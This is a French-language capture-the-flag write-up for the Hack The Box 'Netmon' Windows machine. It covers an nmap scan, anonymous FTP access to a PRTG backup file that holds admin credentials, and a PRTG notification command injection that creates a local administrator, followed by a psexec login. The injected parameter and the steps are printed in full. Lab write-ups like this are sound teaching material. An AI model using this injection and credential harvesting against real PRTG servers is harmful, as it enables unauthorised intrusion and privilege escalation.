# Netmon [Windows] Easy

Liens vers la box :

[https://app.hackthebox.com/machines/Netmon](https://app.hackthebox.com/machines/Netmon)

**— 1. Enumeration —**

`nmap -sT -sV -oN nmap1.txt 10.10.10.152`

```python
# Nmap 7.92 scan initiated Wed Apr  6 11:02:16 2022 as: nmap -sT -sV -oN nmap1.txt 10.10.10.152
Nmap scan report for 10.10.10.152
Host is up (0.023s latency).
Not shown: 993 closed tcp ports (conn-refused)
PORT     STATE    SERVICE      VERSION
21/tcp   open     ftp          Microsoft ftpd
80/tcp   open     http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
135/tcp  open     msrpc        Microsoft Windows RPC
139/tcp  open     netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open     microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1494/tcp filtered citrix-ica
6112/tcp filtered dtspc
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Apr  6 11:02:26 2022 -- 1 IP address (1 host up) scanned in 10.17 secondsOn a donc un serveur ftp nous pouvons essayer d’observer ce qu’il y a dedans.
```

Nous avons aussi un site internet j’ai tester de regarder les différentes pages avec fuff. Malheureusement cela n’aboutie à rien.

**— 2. Serveur FTP —**

On se connecte au serveur FTP en tant anonymous on visite les sous dossier et nous pouvons déjà récupérer le flag user.txt

`get user.txt`

En se baladant toujours on remarque dans les fichier de programme PRTG Network Monitor 

[https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data](https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data)

On peux trouver des fichier sensible en libre accès avec le mot de passe et le nom d’utilisateur dans program data le dossier caché de Windows

`get "PRTG Configuration.old.bak”`

`prtgadmin:PrTg@dmin2018`

Si le mot de passe 2018 marche pas essayer celui ci-dessous

`prtgadmin:PrTg@dmin2019`

**— 3. Faille du site Web —**

 Si nous allons à l’adresse ip 10.10.10.152 nous pouvons nous log en tant qu’admin avec les identifiants récupérer juste avant.

Nous pouvons voir sur le menu la version du logiciel et donc faire des recherche d’exploit.

[https://www.codewatch.org/blog/?p=453](https://www.codewatch.org/blog/?p=453) 

Il y a donc possibilité de créé un utilisateur avec les notifications 

Setup > Account Settings > Notifications

![Untitled](Netmon%20%5BWindows%5D%20Easy%20f0e4fe8b3e1c4d48ad3ecc3979cdaaac/Untitled.png)

Avec le bouton + nous pouvons créé une nouvelle notification.

Tout en bas nous allons directement cocher Execute Program mettre démo outfile.ps1

en paramètre `abc.txt | net user htb abc123! /add ; net localgroup administrators htb /add`

Pour exécuter la notif il suffit d’aller ensuite dans le menu notification et d’appuyer sur le crayon et finalement la cloche. 

La commande est exécuté l’utilisateur est créé nous pouvons nous connecter au prtg depuis notre ordinateur.

**— 4. Ordinateur Cible —**

`psexec.py htb:’abc123!’@10.10.10.152`

Nous somme maintenant sur la machine cible en tant qu’Administrateur nous pouvons donc chercher le flag dans Users/Administrators/Desktop

`type root.txt`